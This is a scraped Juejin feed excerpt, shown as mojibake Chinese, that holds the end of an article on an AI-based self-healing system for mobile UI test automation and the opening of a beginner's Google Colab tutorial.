<p>æµ‹è¯•ä¸­æ–­æ—¶ï¼Œç›¸å…³è‡ªæ„ˆå¼•æ“å¯åŠ¨ï¼š</p>
<ul>
<li>æ–‡æ¡ˆå¼•æ“ï¼šç»“åˆæ§ä»¶ç”»åƒå’ŒåŸºçº¿ï¼Œé€šè¿‡VLå¤§æ¨¡å‹è¿›è¡Œè¯­ä¹‰ã€åŠŸèƒ½ã€ç»“æ„åˆ†æå‡ºæœŸæœ›æ–‡æœ¬ã€‚</li>
<li>å…ƒç´ å¼•æ“ï¼šç»“åˆæ§ä»¶ç”»åƒå’ŒåŸºçº¿ï¼Œé€šè¿‡å¤§æ¨¡å‹å¯¹å½“å‰DOM è®¤çŸ¥ï¼Œåˆ†æå‡ºæœŸæœ›å…ƒç´ ã€‚</li>
</ul>
</li>
<li>
<p>å¤šç»´åº¦åŒ¹é…ï¼Œä»ä¸‰ä¸ªå±‚é¢éªŒè¯æ§ä»¶ä¸€è‡´æ€§ï¼š</p>
<ul>
<li>è¯­ä¹‰å±‚é¢ï¼šè¯­ä¹‰ç›¸ä¼¼åº¦åˆ†ææ ¸å¿ƒæ„å›¾ï¼Œåˆ¤æ–­â€œæ‚¨ç¡®å®šåŠ ä»· 5å…ƒå—?â€ä¸â€œç¡®å®šåŠ ä»·5å…ƒå—?â€æ˜¯å¦åŠŸèƒ½ç­‰ä»·ï¼›</li>
<li>ä½ç½®å±‚é¢ï¼šéªŒè¯æ§ä»¶æ‹“æ‰‘å…³ç³»ï¼Œé€šè¿‡è§†è§‰è¾¹ç•Œå’Œç›¸é‚»èŠ‚ç‚¹åŒ¹é…ï¼Œç¡®è®¤æ§ä»¶ä½ç½®å˜åŒ–æ˜¯å¦å’ŒåŠŸèƒ½åŒ¹é…ï¼›</li>
<li>ç»“æ„å±‚é¢ï¼šåˆ†æ DOM æ ‘å˜åŒ–æ¯”å¯¹å…³é”®è·¯å¾„ï¼Œè¯†åˆ«å±‚çº§é‡æ„çš„åœºæ™¯ï¼›</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>æ™ºèƒ½ä¿®å¤é˜¶æ®µ</strong></p>
</li>
</ul>
<p>ç»“åˆå¤šç»´åº¦åŒ¹é…å’Œæ¨ç†ç½®ä¿¡åº¦ï¼Œå¯¹æœ‰æ•ˆå˜æ›´è‡ªåŠ¨ç”Ÿæˆä¸¤ç§ä¿®å¤ç­–ç•¥ï¼šé€‰æ‹©å™¨ä¼˜åŒ–ï¼ˆè°ƒæ•´ç°æœ‰å®šä½æ¡ä»¶ï¼‰ä¸é€‰æ‹©å™¨é‡æ„ï¼ˆç”Ÿæˆå…¨æ–°å®šä½ï¼‰ã€‚</p>
<ul>
<li>å˜æ›´ç±»å‹è¾“å‡ºï¼šæ–‡æ¡ˆä¼˜åŒ–ã€å…ƒç´ é‡æ„ã€å¸ƒå±€è°ƒæ•´ï¼›</li>
<li>å®šä½å™¨è¾“å‡ºï¼šé€‰æ‹©å™¨é‡æ„ã€å¥å£®æ€§ä¼˜å…ˆçš„å®šä½å™¨ï¼›</li>
<li>æ­¥éª¤çº§åˆ«é‡è¯•ï¼šç²¾å‡†å®šå‘ä¿®å¤ï¼Œä¿ç•™ä¸šåŠ¡æ•°æ®çŠ¶æ€ï¼Œé¿å…é‡å¤ä¹‹å‰çš„æ­¥éª¤ã€‚</li>
</ul>
<p>é¡µé¢å˜åŒ–æ™ºèƒ½æ„ŸçŸ¥ç›¸è¾ƒäºä¼ ç»ŸUIè‡ªåŠ¨åŒ–æ‰§è¡Œæ¨¡å¼å¯¹æ¯”ï¼š</p>



































<table><thead><tr><th><strong>ç»´åº¦</strong></th><th><strong>ä¼ ç»ŸUIè‡ªåŠ¨åŒ–</strong></th><th><strong>é¡µé¢å˜åŒ–æ™ºèƒ½æ„ŸçŸ¥</strong></th><th><strong>AIå…³é”®èƒ½åŠ›å·®å¼‚</strong></th></tr></thead><tbody><tr><td>é—®é¢˜åº”å¯¹æœºåˆ¶</td><td>è„šæœ¬å¤±æ•ˆå³å¤±è´¥ï¼Œä¾èµ–äººå·¥ä¿®å¤</td><td>è‡ªåŠ¨ä»‹å…¥</td><td>AIè‡ªåŠ¨ç”Ÿæˆæ–°å®šä½å™¨å¹¶åŠ¨æ€æ›¿æ¢æ‰§è¡Œ</td></tr><tr><td>ç»´æŠ¤æˆæœ¬</td><td>æ¯æ¬¡UIå˜æ›´éœ€äººå·¥æ›´æ–°å®šä½å™¨</td><td>æ— éœ€äººå·¥ä»‹å…¥</td><td>é™ä½ç»´æŠ¤æˆæœ¬</td></tr><tr><td>è‡ªé€‚åº”èƒ½åŠ›</td><td>ä»…æ”¯æŒé¢„å®šä¹‰åœºæ™¯ï¼Œæ— æ³•å¤„ç†æœªçŸ¥å˜æ›´</td><td>AIè‡ªåŠ¨æ•è·å…ƒç´ ã€æ–‡æœ¬ã€å¸ƒå±€å˜åŒ–</td><td>å¤šæ¨¡æ€æ¯”å¯¹ + LLMè¯­ä¹‰åˆ†æï¼Œç²¾å‡†å®šä½</td></tr><tr><td>èµ„æºæ•ˆç‡</td><td>å…¨é‡æ­¥éª¤é‡è·‘ï¼Œè®¾å¤‡èµ„æºæµªè´¹ä¸¥é‡</td><td>ç²¾å‡†æ­¥éª¤çº§é‡è¯•ï¼Œä¿ç•™ä¸šåŠ¡ä¸Šä¸‹æ–‡</td><td>åªæ¶ˆè€—å¤§æ¨¡å‹æ¨ç†æ—¶é—´</td></tr></tbody></table>
<h2 data-id="heading-11">äº”ã€å®è·µæ•ˆæœä¸æ”¶ç›Š</h2>
<p>æˆ‘ä»¬æ„å»ºçš„AIè‡ªæ„ˆä½“ç³»ï¼Œæ ¸å¿ƒä»·å€¼åœ¨äºçªç ´ä¼ ç»ŸUIè‡ªåŠ¨åŒ–çš„ç»´æŠ¤ç“¶é¢ˆï¼Œå°†è„šæœ¬ç»´æŠ¤æ¨¡å¼ä»â€œäººå·¥è¢«åŠ¨å“åº”â€å‡çº§ä¸ºâ€œç³»ç»Ÿä¸»åŠ¨å…ç–«â€ã€‚è‡ªæ„ˆä½“ç³»ä¸Šçº¿3ä¸ªæœˆä»¥æ¥ï¼Œå·²åœ¨è´§æ‹‰æ‹‰ç§»åŠ¨ç«¯æ ¸å¿ƒä¸šåŠ¡çº¿éªŒè¯æ˜¾è‘—æˆæ•ˆï¼š</p>















<table><thead><tr><th align="left">å¼¹çª—æ™ºèƒ½å¤„ç†</th><th align="left">å…ƒç´ æ™ºèƒ½ä¿®å¤</th><th align="left">æ–‡æ¡ˆæ™ºèƒ½ä¿®å¤</th></tr></thead><tbody><tr><td align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02fce6e1e55340b6ac75b1ac44329ebb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=SMa%2BcYjjjQC9ZvhBi7SniHctiMg%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82311c32a4b54cec9cc127a1f2d8cfed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=gV2%2FVhCVRfa5P0iDPY7he3b0bd0%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f351e00f5e7d414a8aa509d809f46d67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=0Xn2BWZTbtKZm1Vf775PTE4X2V4%3D" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" loading="lazy"/></td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d25e81db85410c8771dd5b6dc0f0cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=qnWX6R3sl%2BGKrRc4dXzUDqyd3PA%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>ç¨³å®šæ€§è·ƒå‡</strong>ï¼šè„šæœ¬å¹³å‡é€šè¿‡ç‡ä»<strong>80%</strong> æå‡è‡³<strong>90%+</strong> ï¼›</li>
<li><strong>è§„æ¨¡åŒ–éªŒè¯</strong>ï¼šåœ¨<strong>325</strong>ä¸ªé«˜é¢‘æ‰§è¡Œè„šæœ¬ä¸­æˆåŠŸå®æ–½è‡ªæ„ˆï¼Œè¦†ç›–äº†å¸æœºç«¯å’Œç”¨æˆ·ç«¯æ ¸å¿ƒè·¯å¾„ï¼›</li>
<li><strong>ç»´æŠ¤æ•ˆç‡æå‡</strong>ï¼šèŠ‚çœè„šæœ¬ç»´æŠ¤åŒå­¦äººåŠ›<strong>40%</strong> ï¼Œå¯ä»¥è½¬å‘é«˜ä»·å€¼æµ‹è¯•åœºæ™¯æ¢ç´¢ï¼›</li>
</ul>
<h2 data-id="heading-12">å…­ã€æœªæ¥å±•æœ›</h2>
<blockquote>
<p>â€œé“é˜»ä¸”é•¿ï¼Œè¡Œåˆ™å°†è‡³ï¼Œè¡Œè€Œä¸è¾ï¼Œæœªæ¥å¯æœŸâ€ã€‚â€”â€”ã€Šè€å­Â·ä¿®èº«ã€‹</p>
</blockquote>
<p>é¢å¯¹ç§»åŠ¨ç«¯æµ‹è¯•æ•ˆèƒ½çš„â€œæœ€åä¸€å…¬é‡Œâ€æŒ‘æˆ˜ï¼Œæˆ‘ä»¬åŸºäºè§†è§‰å¤§æ¨¡å‹ï¼ˆVLMï¼‰æŠ€æœ¯æ„å»ºè‡ªé€‚åº”çš„æ–°èŒƒå¼æ­£é€æ­¥ç ´è§£ä¼ ç»ŸUIè‡ªåŠ¨åŒ–æµ‹è¯•å±€é™çš„éš¾é¢˜ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¬¡å¼•ç”¨ã€Šè€å­Â·ä¿®èº«ã€‹ï¼šâ€œé“é˜»ä¸”é•¿ï¼Œè¡Œåˆ™å°†è‡³ï¼Œè¡Œè€Œä¸è¾ï¼Œæœªæ¥å¯æœŸâ€ã€‚åœ¨AIæŠ€æœ¯é£é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œæˆ‘ä»¬ç§‰æŒâ€œAIå¢å¼ºè€Œéæ›¿ä»£äººç±»â€çš„ç†å¿µï¼Œé€šè¿‡æŒç»­çš„æŠ€æœ¯åˆ›æ–°ä¸å·¥ç¨‹å®è·µæ¥æå‡æµ‹è¯•æ•ˆç‡ä¸è½¯ä»¶è´¨é‡ã€‚æ¥ä¸‹æ¥ï¼ŒAIè‡ªæ„ˆèƒ½åŠ›å°†æŒç»­æ¼”è¿›ï¼š</p>
<ul>
<li><strong>ä»è‡ªæ„ˆåˆ°è‡ªå»ºï¼šæ™ºèƒ½ç”Ÿæˆè‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹</strong></li>
</ul>
<p>å½“å‰AIè‡ªæ„ˆç³»åœ¨åº”å¯¹å±€éƒ¨UIè°ƒæ•´æ—¶æ•ˆæœæ˜¾è‘—ï¼Œä½†å¯¹éœ€æ±‚å˜æ›´å¼•å‘çš„äº¤äº’æµç¨‹é‡æ„å­˜åœ¨èƒ½åŠ›è¾¹ç•Œã€‚æœªæ¥æˆ‘ä»¬å°†æ„å»ºç”¨ä¾‹æ™ºèƒ½ç”Ÿæˆåˆ°è‡ªæ„ˆä¼˜åŒ–çš„å…¨é“¾è·¯é—­ç¯ã€‚</p>
<ul>
<li><strong>èµ‹èƒ½å…¶å®ƒæ™ºèƒ½ä½“</strong></li>
</ul>
<p>æä¾›MCPæˆ–è€…OpenAPIèƒ½åŠ›ï¼Œæ‰‹å·¥æµ‹è¯•ç”¨ä¾‹AIæ‰§è¡ŒAgentã€æ™ºèƒ½ä¸‹å•éå†æœåŠ¡çš„æ¥å…¥ã€‚</p>
<ul>
<li><strong>å‡å°‘æˆæœ¬</strong></li>
</ul>
<p>é’ˆå¯¹AIè‡ªæ„ˆå¤šæ¨¡æ€è¾“å…¥çš„é«˜tokensæ¶ˆè€—é—®é¢˜ï¼Œå‡ºäºæˆæœ¬è€ƒé‡ï¼Œæˆ‘ä»¬å°†é€šè¿‡å¤šæ¨¡æ€æ•°æ®ç²¾ç®€ä¸æµç¨‹ä¼˜åŒ–ç­‰æ–¹é¢èŠ‚çœtokensã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[å¤§æ¨¡å‹å®æˆ˜ 03é¢„å¤‡] äº‘ç«¯ç‚¼ä¸¹æˆ¿ 1ï¼šGoogle Colab ä¸Šæ‰‹æŒ‡å—]]></title>    <link>https://juejin.cn/post/7602246300453994531</link>    <guid>https://juejin.cn/post/7602246300453994531</guid>    <pubDate>2026-02-03T12:08:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602246300453994531" data-draft-id="7602205524719337506" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[å¤§æ¨¡å‹å®æˆ˜ 03é¢„å¤‡] äº‘ç«¯ç‚¼ä¸¹æˆ¿ 1ï¼šGoogle Colab ä¸Šæ‰‹æŒ‡å—"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,Google"/> <meta itemprop="datePublished" content="2026-02-03T12:08:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿å°”çš„ä»£ç å±‹"/> <meta itemprop="url" content="https://juejin.cn/user/2637068702854868"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [å¤§æ¨¡å‹å®æˆ˜ 03é¢„å¤‡] äº‘ç«¯ç‚¼ä¸¹æˆ¿ 1ï¼šGoogle Colab ä¸Šæ‰‹æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637068702854868/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿å°”çš„ä»£ç å±‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:08:32.000Z" title="Tue Feb 03 2026 12:08:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">[å¤§æ¨¡å‹å®æˆ˜ 03é¢„å¤‡] äº‘ç«¯ç‚¼ä¸¹æˆ¿ 1ï¼šGoogle Colab ä¸Šæ‰‹æŒ‡å—</h2>
<blockquote>
<p><strong>æ ¸å¿ƒæ‘˜è¦ (TL;DR)</strong></p>
<ul>
<li><strong>ç—›ç‚¹</strong>ï¼šæœ¬åœ°ç”µè„‘æ˜¾å­˜ä¸è¶³ï¼Œè·‘ä¸åŠ¨ 7B ä»¥ä¸Šçš„å¤§æ¨¡å‹ï¼Œæˆ–è€…è¿è¡Œé€Ÿåº¦å¦‚èœ—ç‰›ã€‚</li>
<li><strong>æ–¹æ¡ˆ</strong>ï¼šåˆ©ç”¨ <strong>Google Colab</strong> æä¾›çš„å…è´¹ Tesla T4 GPU ç®—åŠ›ã€‚</li>
<li><strong>æŠ€å·§</strong>ï¼šé€šè¿‡æŒ‚è½½ <strong>Google Drive</strong>ï¼Œè§£å†³ Colab è¿è¡Œæ—¶é‡ç½®å¯¼è‡´æ¨¡å‹æ–‡ä»¶ä¸¢å¤±çš„é—®é¢˜ã€‚</li>
<li><strong>ç›®æ ‡</strong>ï¼šé…ç½®å¥½äº‘ç«¯ç¯å¢ƒï¼Œä¸ºä¸‹ä¸€ç¯‡â€œäº‘ç«¯è¿è¡Œ RAGâ€æ‰“å¥½åœ°åŸºã€‚</li>
</ul>
</blockquote>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>Ollamaå› ä¸ºæœ‰llama.cppåº“å’Œé‡åŒ–æŠ€æœ¯çš„åŠ æˆï¼Œæ˜¯å¯ä»¥åœ¨cpuå’Œæ›´æ—¥å¸¸çš„ç”µè„‘ä¸Šè¿è¡Œçš„ï¼Œä½†æ˜¯æ€§èƒ½æ˜¯è¿œæ¯”ä¸ä¸Šåœ¨ä¸“ä¸šçš„æ˜¾å­˜è®¾å¤‡ä¸Šçš„ã€‚
æœ‰é«˜ç«¯æ˜¾å¡ï¼ˆNVIDIA 4090/5090/A100/H100ï¼‰ï¼Œå¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šè„±ç¼°è¿è¡Œå°è§„æ¨¡çš„å¤§æ¨¡å‹ã€‚ä½†æ˜¯å¯¹äºæ²¡æœ‰é«˜ç«¯æ˜¾å¡è®¾å¤‡çš„å‹äººä»¬ä¹Ÿä¸ç”¨æ‹…å¿ƒ, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è°·æ­Œå¤§å–„äººå¸¦ç»™æˆ‘ä»¬çš„å…è´¹GPUç®—åŠ›ï¼šçˆ±æ¥è‡ªGoogle Colabã€‚ æœ¬ç¯‡åšæ–‡çš„ä¸»è¦ç›®çš„å°±æ˜¯æå‰å¸¦å„ä½å‹äººä»¬ä»é›¶ä¸Šæ‰‹Colabçš„æ ¸å¿ƒæ“ä½œï¼Œç¡®ä¿åœ¨æˆ‘ä»¬åç»­çš„å®æˆ˜è¿‡ç¨‹ä¸­çš„æµç•…æ“ä½œã€‚</p>
<h3 data-id="heading-2">1. Google Colab</h3>
<p>ä¸€è¨€æ¦‚ä¹‹ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fcolab.research.google.com%2F" target="_blank" title="https://colab.research.google.com/" ref="nofollow noopener noreferrer">Google Colab</a> = <strong>Jupyter Notebook</strong> + <strong>äº‘ç«¯æœåŠ¡å™¨</strong></p>
<ul>
<li><strong>Jupyter Notebook</strong>ï¼šæˆ‘ä»¬çŸ¥é“pythonæ˜¯ä¸€é—¨åŠ¨æ€è„šæœ¬è¯­è¨€ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¸€è¾¹ç¼–å†™ï¼Œä¸€è¾¹ä»¥äº¤äº’å¼çš„æ–¹å¼çœ‹åˆ°å½“å‰ç»“æœï¼Œç„¶åè¿˜èƒ½ç»§ç»­å¾€ä¸‹å†™ã€‚Jupyter Notebookå°±æ˜¯ä¸€ç§å¯ä»¥ä¸€è¾¹å†™ä»£ç ï¼Œä¸€è¾¹å†™æ–‡æ¡£ï¼Œè¿˜èƒ½å®æ—¶çœ‹åˆ°ä»£ç è¿è¡Œç»“æœçš„äº¤äº’å¼ç¬”è®°ã€‚</li>
<li><strong>äº‘ç«¯æœåŠ¡å™¨</strong>ï¼šåŒºåˆ«äºåœ¨æˆ‘ä»¬æœ¬åœ°ç¯å¢ƒå†™ä»£ç æ—¶ï¼Œä»£ç åœ¨æˆ‘ä»¬çš„æœ¬åœ°ç”µè„‘ï¼Œæ¢ä¸€å°ç”µè„‘å°±éœ€è¦é‡æ–°æ‹‰å–ä»£ç è¿è¡Œï¼Œåœ¨äº‘ç«¯æœåŠ¡å™¨ç¼–ç æ˜¯åœ¨è¿œç¨‹çš„æœåŠ¡å™¨ç¼–ç ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„ç”µè„‘ï¼Œç”šè‡³æ‰‹æœºæˆ–è€…ä»»ä½•èƒ½è”ç½‘æ‰“å¼€æµè§ˆå™¨çš„è®¾å¤‡ï¼Œè¿æ¥ä¸Šè¿œç¨‹çš„é‚£å°æœåŠ¡å™¨è¿›è¡Œä»£ç ç¼–å†™å’Œæ¨¡å‹è®­ç»ƒã€‚ä¼šæ›´ä¸ºçµæ´»ï¼Œä¸å—è®¾å¤‡é™åˆ¶ã€‚</li>
</ul>
<h3 data-id="heading-3">2. å¿«é€Ÿä»‹ç»</h3>
<h4 data-id="heading-4">2.1 è®¿é—®ä¸åˆ›å»º</h4>
<ol>
<li>å’±ä»¬ç¡®ä¿æœ‰ä¸€ä¸ªGoogleè´¦æˆ·ï¼Œå¹¶ä¸”ç™»å½•</li>
<li>è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Fcolab.research.google.com%2F" target="_blank" title="https://colab.research.google.com/" ref="nofollow noopener noreferrer">Google Colab å®˜ç½‘</a>,å°±ä¼šè¿›å…¥åˆ°ä¸€ä¸ªæ¬¢è¿ç•Œé¢
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/the_initial_page_colab.png" alt="è¿›å…¥Colabçš„æ¬¢è¿é¡µé¢æˆªå›¾" loading="lazy"/></li>
<li>ç‚¹å‡»èœå•æ ä¸Š<strong>File</strong>-&gt;<strong>new notebook in drive</strong>åˆ›å»ºæ–°çš„ç¬”è®°æœ¬
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/new_notebook_file.png" alt="Colabèœå•æ æ‰“å¼€Fileé¼ æ ‡æŒ‡å‘å…¶ä¸‹æ‹‰èœå•new notebook in driveçš„æˆªå›¾" loading="lazy"/>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/new_notebook_ui.png" alt="åˆ›å»ºæ–°çš„notebookåçš„æ–°notebookç•Œé¢æˆªå›¾" loading="lazy"/></li>
</ol>
<h4 data-id="heading-5">2.2 ç•Œé¢ä»‹ç»</h4>
<p>åœ¨æ–°çš„notebookç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p>
<ul>
<li><strong>æ–‡ä»¶å</strong>ï¼šå·¦ä¸Šè§’â€œUntitled0.ipynbâ€çš„æ–‡ä»¶å,å¯ä»¥å•å‡»é‡å‘½å,ipynbå°±æ˜¯jupyter notebookçš„åç¼€å
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/file_name.png" alt="notebookç•Œé¢é‡æ–°é‡å‘½ååçš„æ–‡ä»¶åæˆªå›¾" loading="lazy"/></li>
<li><strong>å•å…ƒæ ¼</strong>ï¼šé¡µé¢ä¸­å¿ƒä¸€é•¿æ¡å¸¦ä¸€ä¸ªâ–¶æŒ‰é’®çš„å°±è¯´å•å…ƒæ ¼ï¼Œä¹Ÿå«Cellï¼Œæ˜¯æˆ‘ä»¬çš„æ ¸å¿ƒç¼–ç åŒºåŸŸ, Jupyter notebookçš„é€»è¾‘æ˜¯â€œä¸€æ®µä¸€æ®µâ€æ‰§è¡Œä»£ç ï¼Œè€Œéæˆ‘ä»¬å¹³å¸¸å†™ä»£ç æ—¶å€™å†™å®Œä¸€æ•´ä¸ªæ–‡ä»¶å†æ‰§è¡Œã€‚
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/cell.png" alt="notebookç•Œé¢ä¸­å¿ƒå•å…ƒæ ¼çš„æˆªå›¾" loading="lazy"/></li>
